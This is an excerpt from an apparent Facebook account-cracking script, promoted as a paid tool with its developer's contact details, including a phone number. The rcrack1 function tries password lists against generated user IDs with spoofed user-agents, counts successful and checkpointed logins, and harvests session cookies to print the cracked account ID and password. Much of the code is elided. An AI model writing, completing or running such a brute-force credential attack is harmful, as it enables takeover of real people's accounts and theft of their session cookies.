...
for xd in range(10000):
    ...
    uaku2=(f'{a}{b}{c}{d}{e}{f}')
    ugen.append(uaku2)
os.system('xdg-open https://github.com/BINOD-XD')
logo = """
$$$$$\  $$$$$$\  $$\   $$\ $$$$$$\ $$$$$$$\  
   \__$$ |$$  __$$\ $$ |  $$ |\_$$  _|$$  __$$\ 
      $$ |$$ /  $$ |$$ |  $$ |  $$ |  $$ |  $$ |
...
88   YD Y88888P Y8888D'  `Y88P'  YP    YP\033[1;34;40m 2.2 
\x1b[1;97m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
\33[1;41m  THIS IS PAID TOOL SO YOU NEED TO TAKE APPROVAL\33[0m
\x1b[1;97m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
⚔️ DEVELOPER  :         JAHID 
⚔️ FACEBOOK   :          3:) Jahid Hasan 3:)
⚔️ WHATSAPP   :          01865508461
⚔️ GITHUB     :          Jahid-444
...
class Main:
    def __init__(self):
        ...
        print("\033[1;32m ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━")
        Mumit =input(" [?] Choose : ")
        os.system('xdg-open https://www.facebook.com/tahosin.broos')
        if Mumit in ["1", "01"]:
            num()
        if Mumit in ["2","02"]:
            gml()
...
def rcrack1(uid,pwx,tl):
    ...
    try:
        for ps in pwx:
            ...
            sys.stdout.write('\r[\033[1;92mJAHID\033[1;97m] > [%s/%s] > [OK\033[1;97m:-\033[1;92m%s\033[1;97m] - [CP\033[1;97m:-\033[1;91m%s\033[1;97m] \r'%(loop,tl,len(oks),len(cps))),
            sys.stdout.flush()
    ...
    'user-agent': max}
            ...
            if 'c_user' in log_cookies:
                ...
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[82:97]
                print(f"\x1b[38;5;196m[JAHID-XD] {cid} | {ps}")
